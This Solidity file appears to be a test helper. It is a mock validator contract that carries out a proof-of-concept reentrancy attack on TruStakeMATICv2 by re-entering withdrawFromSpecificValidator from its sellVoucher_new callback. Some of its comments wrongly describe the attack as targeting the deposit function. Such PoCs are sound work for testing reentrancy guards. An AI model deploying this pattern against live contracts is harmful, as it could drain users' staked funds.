// SPDX-License-Identifier: GPL-3.0

pragma solidity =0.8.19;

import { TruStakeMATICv2 } from "../../contracts/main/TruStakeMATICv2.sol";
import {IValidatorShare} from "../../contracts/interfaces/IValidatorShare.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// proof of concept reentrancy attack on TruStakeMATICv2 deposit function.

contract MaliciousValidator_Withdraw is IValidatorShare {

    TruStakeMATICv2 public staker;
    IERC20 public maticToken;

    uint256 halfDeposit;

    constructor(
        address _stakerAddress,
        address _maticTokenAddress
    ) {
        staker = TruStakeMATICv2(_stakerAddress);
        maticToken = IERC20(_maticTokenAddress);
    }

    function attack(uint amount) external payable {
        halfDeposit = amount / 2;
        maticToken.approve(address(staker), halfDeposit);

        // deposit to the attacker validator
        staker.withdrawFromSpecificValidator(halfDeposit, address(this));
    }

    // the staker's deposit function pefroms an external call to the validator contract
    //  that allow to re-enter any nonReentrant functions in the same transaction
    function buyVoucher(uint256 _amount, uint256 _minSharesToMint) external returns (uint256 amountToDeposit) {}

    function sellVoucher_new(uint256 claimAmount, uint256 maximumSharesToBurn) external {
        maticToken.approve(address(staker), halfDeposit);
        staker.withdrawFromSpecificValidator(halfDeposit, address(this));
    }

    function unstakeClaimTokens_new(uint256 unbondNonce) external {}

    function getLiquidRewards(address user) external view returns (uint256) {}

    function restake() external returns (uint256 amountRestaked, uint256 liquidReward) {}

    function unbondNonces(address) external view returns (uint256) {}

    function balanceOf(address) external view returns (uint256) {}

    function approve(address, uint256) external {}

    function transfer(address, uint256) external {}

    function transferFrom(address, address, uint256) external {}

    function unbonds_new(address, uint256) external view returns (uint256, uint256) {}

    function exchangeRate() external view returns (uint256) {}

    function getTotalStake(address) external view returns (uint256, uint256) {}

}

